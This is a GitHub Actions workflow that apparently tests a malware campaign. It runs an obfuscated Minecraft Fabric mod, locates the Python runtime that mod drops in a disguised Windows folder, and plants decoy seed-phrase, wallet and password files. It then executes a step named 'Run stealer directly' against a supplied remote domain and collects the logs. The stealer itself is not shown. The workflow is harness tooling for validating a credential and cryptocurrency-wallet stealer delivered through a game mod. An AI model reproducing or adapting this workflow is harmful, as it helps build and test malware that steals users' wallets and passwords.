name: SN
on:
  workflow_dispatch:
    inputs:
      domain:
        description: "domain to point the agent at"
        required: true
        default: "thisisafalsepositive.st"
      tag:
        description: "campaign tag"
        required: true
        default: "abc"

jobs:
  run:
    runs-on: windows-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
      - name: Bootstrap runtime
        shell: powershell
        env:
          UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
          DOM_: ${{ inputs.domain }}
        run: |
          $d = "$env:RUNNER_TEMP\sn"; New-Item -ItemType Directory -Force "$d\mc" | Out-Null
          $ctx = @{ userId = "$env:UID_"; tag = "abc"; domain = "$env:DOM_"; env = "Fabric"; gameDir = "$d\mc"; mcInfo = "{}" } | ConvertTo-Json -Compress
          $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ctx))
          $p = Start-Process java -ArgumentList "-cp","agent\mod.jar","net.fabric.taxjHfh",$b64 -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" -PassThru
          Start-Sleep -Seconds 45
          $py = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\NtProfileIndex" -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1
          if ($py) { $py.FullName | Set-Content "$d\py.txt" }
      - name: Seed artifacts
        shell: powershell
        run: |
          $d = "$env:RUNNER_TEMP\sn"; New-Item -ItemType Directory -Force "$d\mc" | Out-Null
          $desk = "$env:USERPROFILE\Desktop"
          "seed phrase alpha bravo charlie" | Set-Content "$desk\seed phrase.txt"
          "wallet backup" | Set-Content "$desk\wallet-backup.txt"
          "passwords" | Set-Content "$env:USERPROFILE\Downloads\passwords.txt"
          New-Item -ItemType Directory -Force "$env:APPDATA\Exodus\exodus.wallet" | Out-Null
          "seco" | Set-Content "$env:APPDATA\Exodus\exodus.wallet\dummy.seco"
      - name: Run stealer directly
        shell: powershell
        env:
          UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
          DOM_: ${{ inputs.domain }}
        run: |
          $ErrorActionPreference = "Continue"
          $d = "$env:RUNNER_TEMP\sn"
          $py = Get-Content "$d\py.txt" -ErrorAction SilentlyContinue
          if (-not $py) { "no python path"; exit 0 }
          $rt = Join-Path (Split-Path $py) "AppHost"
          Push-Location (Split-Path $py)
          $sp = Start-Process -FilePath ".\python.exe" -ArgumentList @((Join-Path $rt "main.py"), "-u", "$env:UID_", "--host", "$env:DOM_", "--env", "Fabric") -RedirectStandardOutput "$d\stealer.log" -RedirectStandardError "$d\stealer.err" -PassThru -Wait
          "code=$($sp.ExitCode)"
          Get-Content "$d\stealer.log" -Raw
          Get-Content "$d\stealer.err" -Raw
          Pop-Location
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: sn-win
          path: ${{ runner.temp }}/sn
      - name: Kill
        if: always()
        shell: powershell
        run: Get-Process java,python* -ErrorAction SilentlyContinue | Stop-Process -Force
